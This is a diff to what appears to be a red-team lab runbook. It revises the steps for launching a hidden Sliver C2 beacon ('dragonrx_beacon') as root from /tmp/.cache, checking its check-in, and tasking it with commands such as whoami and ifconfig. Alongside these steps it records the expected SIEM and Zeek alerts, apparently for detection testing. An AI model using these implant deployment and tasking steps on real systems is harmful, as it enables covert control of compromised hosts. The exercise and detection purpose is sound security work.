@@ -484,17 +484,31 @@ nohup /tmp/.cache/dragonrx_beacon &>/dev/null &
 echo "Beacon PID: $!"
 ```
 
-**Step 5 — Verify session in Sliver (check-in within ~35 seconds):**
+**Step 5 — Verify beacon check-in (within ~35 seconds):**
 
 ```bash
 [C2]
-sliver > sessions
+sliver > beacons
 ```
 
 **Expected:**
 ```
-ID  Name             Transport  RemoteAddress         Hostname  Username  OS/Arch      Last Message
-1   dragonrx_beacon  http       10.0.0.100:XXXXX      web01     root      linux/amd64  5s ago
+ID        Name             Transport  Hostname  Username  OS/Arch      Last Check-In  Next Check-In
+dc189fbc  dragonrx_beacon  http       web01     root      linux/amd64  5s ago         ~30s
+```
+
+> **Beacons ≠ Sessions:** `generate beacon` creates an async implant — it checks in on a schedule,
+> gets queued tasks, executes them, and reports back. It does NOT appear under `sessions`.
+> Use `beacons` to list them and `use <ID>` to task them.
+
+**Interact with the beacon:**
+```bash
+sliver > use dragonrx_beacon
+sliver (dragonrx_beacon) > whoami
+# [*] Tasked beacon: whoami
+# root
+sliver (dragonrx_beacon) > getpid
+sliver (dragonrx_beacon) > ifconfig
 ```
 
 **SIEM alert fired:**
@@ -550,7 +564,8 @@ ps aux | grep -E 'dragonrx_beacon|rxphage' | grep -v grep
 - Zeek dns.log: Query for `updates.oracle-cdn.com` (NX) — **MEDIUM**
 
 ```bash
-sliver > use 1          # or: use dragonrx_beacon
+sliver > beacons
+sliver > use dragonrx_beacon
 sliver (dragonrx_beacon) > whoami
 # root
 
